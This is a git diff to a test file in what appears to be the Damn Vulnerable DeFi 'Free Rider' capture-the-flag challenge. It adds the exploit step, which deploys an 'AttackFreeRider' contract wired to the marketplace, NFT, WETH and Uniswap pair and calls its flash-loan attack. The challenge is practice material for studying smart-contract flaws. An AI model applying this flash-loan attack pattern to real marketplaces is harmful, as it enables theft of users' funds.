@@ -105,6 +105,27 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+	const hackWeth = this.weth.connect(attacker);
+	const hackToken = this.token.connect(attacker);
+	const hackFactory = this.uniswapFactory.connect(attacker);
+	const hackMarketplace = this.marketplace.connect(attacker);
+	const hackBuyer = this.buyerContract.connect(attacker);
+	const hackNft = this.nft.connect(attacker);
+
+	const attackFactory = await ethers.getContractFactory("AttackFreeRider",attacker);
+	const attackContract = await attackFactory.deploy( hackWeth.address, hackFactory.address, hackToken.address, hackMarketplace.address, hackBuyer.address, hackNft.address);
+/*
+address payable _wethAddr,
+address _factoryAddr,
+address _dvtAddr,
+address payable _marketPlaceAddr,
+address _freeRiderBuyerAddr,
+address _nftAddr
+*/
+	const pair = await this.uniswapFactory.getPair(this.token.address, this.weth.address);
+
+	console.log("Pair on hardhat side: ",pair); 
+	attackContract.flashLoanAttack(hackToken.address,NFT_PRICE, pair, {gasLimit: 1e6}); 
     });
 
     after(async function () {
